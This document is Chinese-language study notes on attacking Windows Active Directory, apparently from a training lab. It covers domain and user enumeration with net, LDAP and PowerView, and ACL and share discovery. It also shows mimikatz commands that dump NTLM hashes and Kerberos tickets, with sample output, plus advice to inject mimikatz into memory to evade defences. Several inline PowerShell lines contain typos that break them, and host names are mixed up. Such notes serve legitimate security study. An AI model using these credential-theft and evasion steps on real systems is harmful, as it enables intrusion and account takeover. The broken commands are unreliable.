# 探测是否含有域
`ipconfig /all`   使用 ipconfig 命令探测是否含有域，当显示域名后缀时，则含有域或者这个主机包含在域环境中
`nslookup corp.com`  反向查找对应的 ip
`systeminfo`  也可以使用 systeminfo 来查询是否在域中
`net config workstation`  使用 net 查看本机工作环境，其中包括是否包含在域中


# 域hash存储
为了利于横向移动，要知道认证的hash存储在哪
这些hash表被存储在本地安全认证子系统服务(LSASS)内存空间中，但是LSASS运行在SYSTEM权限，则需要计算机管理员权限才可以访问
**但是，由于使用mimikaz，常见反入侵或者应用防火墙将其已经加入黑名单，所以一般会将mimikaz直接注入到内存执行，躲避防御软件**


## 使用mimikaz的sekurlsa模块获取本地存储hash
当前用户为本地主机的管理员或者输入管理员组，可以使用mimikaz工具枚举本地NTLM hash
对于 Windows2003函数级的 AD 实例，NTLM 是唯一可用的哈希算法。对于运行 WindowsServer2008或更高版本的实例，可以同时使用 NTLM 和 SHA-1(AES 加密的公共伴侣)。在较老的操作系统，如 Windows7，或者手动设置 WDigest11的操作系统上，将启用 WDigest11。
`.\mimikaz.exe`
`privilege::debug `
`sekurlsa::logonpasswords`
最后会输出本机存储的所有用户NTLM hash


```txt
结果：
Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea     #NTLM
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f    #在新版本中，NTLM与SHA1同时出现
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
```



## 使用mimikaz获取kerberos中Ticket
TGS或者TGT可以使用mimikaz保存在磁盘上，或者从磁盘导入到LSASS内存中
`sekurlsa::tickets`
最后输出本机保存的所有用户的TGT和TGS票据


```txt
结果：
Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service    #TGS票据
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket   #TGT票据
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
```


# 初步枚举用户和组

## 可以使用 net 工具初步探测（net 工具默认安装在所有 windows 中）
`net user /domain`
`net view /domain`
这个命令会类出域中所有用户，在于域环境的大小，这个输出可能或很多
继续枚举用户
`net user pete /domain`
这个命令会枚举出该用户在域中的各种信息，包括该用户属于那个组
`net group /domain`
输出域中所有组
`net group "Domain Admins" /domain`
查看单个域组含有那些用户


## 使用. NET 类继续枚举
使用 LDAP 协议与域控制器通信，可以获取域信息
大多情况含有嵌套组。嵌套组在 AD 中相对常见，并且可以很好地扩展，即使是最大的 AD 实现也允许灵活性和动态的成员定制。
net 工具忽略了这一点，因为它只列出用户对象，而不是组对象。
另外，net 不能显示特定的属性，这强调了定制工具的好处。
`[System.DirectoryService.ActiveDirectory.Domain]::GetCurrentDomain()`       这个命令会枚举出域中的信息，包括PDC的名称   
`$PDC=[System.DirectoryService.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name`    直接获取PDC名称
`$DN=([asdi]'').distinguishedName`      这个命令获取DN
`$LDAP="LDAP://$PDC/$DN"`      最后得到LDAP路径
获得 LDAP 请求方式，可以使用 DirectoryEntry，DirectorySearcher 方法请求 PDC
`$directory=New-Object System.DirectoryServices.DirectoryEntry($LDAP)`
`$dirsearch=New-Object System.DiectoryServices.DirectorySearcher($directory)`
`$dirsearch.FindAll()`             最后输出域中的所有对象，一般含有大量信息，可以使用过滤器对其过滤
官方文档显示了 samAccountType 属性的不同值，但我们将从0x30000000(小数点后805306368)开始，它将列举域中的所有用户
`$dirsearch.filter="samAccountType=805306368"`


枚举枚举脚本：
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```
使用方法：
```powershell
powershell -ep bypass
Import-Module .\function1.ps1
LDAPSearch -LDAPQuery "name=jeffadmin" #输出域用户jeffadmin信息
LDAPSearch -LDAPQuery "&((objectCategory=group)(cn=Sales Department))" #输出Sales Department组的信息
```


## 使用自动化工具 PowerView枚举用户和组
可以使用自动化脚本PowerView来枚举域环境
`Import-Module .\PowerView.ps1`    导入PowerView脚本
`Get-NetDomain`      获取域信息，包括PDC
`Get-NetUser`    获取域中所有用户，但是会输出很多内容，可以所选择输出
`Get-NetUser | select cn`    列出所有域中所有用户名称
`Get-NetUser | select cn,pwdlastset,lastlogon`
`Get-NetGroup | select cn`    列出域中所有组
`Get-NetGroup "Sales Department" | select member`    使用该命令枚举嵌套组



# 枚举域主机
## 使用PowerView脚本来枚举域中的主机信息
`Get-NetComputer | select operatingsystem,dnshostname`
输出对应主机的操作系统版本和对应域名



# 枚举登录用户
>一般枚举域环境中，多注意帐号和帐号之间或者组和组之间的关系，从中构建域环境的映射，找到潜在攻击对象
## 使用PowerView枚举登录用户
加载PowerView然后使用命令
`Find-LocalAdminAccess`
`client74.corp.com`  返回具有管理员权限的域名
**有时PowerView的枚举可能不会成功，在于有些工具使用的API在新版本window中不再使用或者被严格限制，这是选择其他工具**


使用Find-LocalAdminAccess查找当前用户对域中那台主机具有管理员权限
原理：
PowerView 的 Find-LocalAdminAccess 命令扫描网络，试图确定当前用户是否对域中的任何计算机具有管理权限。该命令依赖于 OpenServiceW 函数1，该函数将连接到目标计算机上的服务控制管理器(SCM)。SCM 基本上维护 Windows 计算机上已安装的服务和驱动程序的数据库。PowerView 将尝试使用 SC _ MANAGER _ ALL _ ACCESS 访问权限打开这个数据库，这需要管理权限，如果连接成功，PowerView 将认为我们的当前用户在目标机器上拥有管理权限。
```powershell
Get-NetSession -ComputerName Client75

CName        : \\192.168.50.75
UserName     : stephanie
Time         : 8
IdleTime     : 0
ComputerName : client74  #返回用户登录到哪台计算机之类的信息
```
原理：
PowerView 的 Get-NetSession 命令在底层使用了 NetWkstaUserEnum 和 NetSessionEnum API。根据 NetSessionEnum 的文档，有五个可能的查询级别: 0、1、2、10、502。级别0只返回建立会话的计算机的名称。级别1和级别2返回更多信息，但需要管理特权。
剩下10层和502层。两者都应该返回诸如计算机名称和建立连接的用户名称之类的信息。默认情况下，PowerView 使用 NetSessionEnum 的查询级别10，这应该会提供我们感兴趣的信息。
用 NetSessionEnum 枚举会话所需的权限在 SrvsvcSessionInfo 注册表项中定义，该注册表项位于 HKEY _ LOCAL _ MACHINE SYSTEM CurrentControlSet Services LanmanServer DefaultSecurity hive 中
```powershell
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
使用 Get-Acl。这个命令实际上将检索我们用-Path 标志定义的对象的权限
```
不难发现，普通用户USers只有可读的权限，无法更改，导致Get-NetSession无法工作


## 使用PsLoggedon工具枚举登录用户
对于较新的系统，PowerView会力不从心，这是要跟换工具枚举
`.\PsLoggedon.exe \\client74`
返回在files04主机己经登录的用户
`<unknown time>             CORP\jeffadmin`
枚举出files04主机已经登录这jeff用户，而且之前使用PowerView中的Find-LocalAdminAccess发现自己对client74有管理员权限，则登录client74可以窃取jaffadmin的凭据


# 枚举服务账户
在windows中程序运行要在所对应的用户上下文环境中运行，程序使用的权限也是对应该服务用户的权限，所以在域中枚举服务帐号也很重要
*管理服务帐户是 Windows Server 2008 R2引入的，用于复杂的应用程序，这需要与 ActiveDirectory 进行更紧密的集成。较大的应用程序如 MSSQL 和 MicrosoftExchange 在运行时通常需要服务器冗余来保证可用性，但托管服务帐户不支持这一点。为了解决这个问题，WindowsServer2012引入了组托管服务帐户，但这要求域控制器运行 WindowsServer2012或更高版本。因此，一些组织可能仍然依赖于基本的服务帐户。我们可以枚举域中的所有SPN来得知，对应主机开放什么端口，所以不需要广泛端口扫描*
使用cmd中的命令setspn查询服务账户
`setspn -L iis_service`
返回域中服务帐号对应的SPN信息
`Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:`
`        HTTP/web04.corp.com`
`        HTTP/web04`
`        HTTP/web04.corp.com:80`
或者使用PowerView中的NetUser获取
`Get-NetUser -SPN | select samaccountname,serviceprincipalname`



# 枚举对象权限
## 使用PowerView枚举对象权限
我们将枚举与 ActiveDirectory 对象关联的特定权限
AD 中的一个对象可能拥有一组使用多个访问控制条目(ACE)应用于它的权限。这些 ACE 组成访问控制列表(ACL)。每个 ACE 定义是否允许访问特定对象或拒绝访问。
常见使用权限：
`GenericAll: 全部权限`
`GenericWrite: 写权限`
`WriteOwner: 切换所属`
`WriteDACL: 修改ACE`
`AllExtendedRights: 更改密码，设置密码等等`
`ForceChangePassword: 更改密码`
`Self (Self-Membership): 加入组`
**导入PowerView执行ObjectAcl命令**
`Get-ObjectAcl -Identity stephanie`
输出枚举stephanie用户应用与那些ACE
其中最关心的是ActiveDirectoryRights，ObjectSID和SecurityIdentifier属性
由于SID太长并且不知道其中含有什么
`S-1-5-21-1987370270-658905905-1781884369-553 | Convert-SidToName`       将SID转化为可读字符串
最后得知RAS and IAS 服务器组对stephanie具有 ReadProperty 访问权限。虽然这是 AD 中的一个常见配置，可能不会给我们提供攻击向量，但是我们已经使用了这个示例来理解我们所获得的信息。
`Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights`           枚举对management Department组拥有完全权限的账户
使用net工具将用户加入该组，查看是否含有更进一步权限
**使用Get-ACL枚举权限**
`dir | Get-Acl`  将当前所有文件输入，查询所有文件的使用权限



# 枚举域共享
## 使用PowerView枚举共享
使用PowerView枚举域中共享
`Find-DomainShare`      列出域中所有共享信息
`ls \\DC1.corp.com\SYSVOL`     查看共享内容





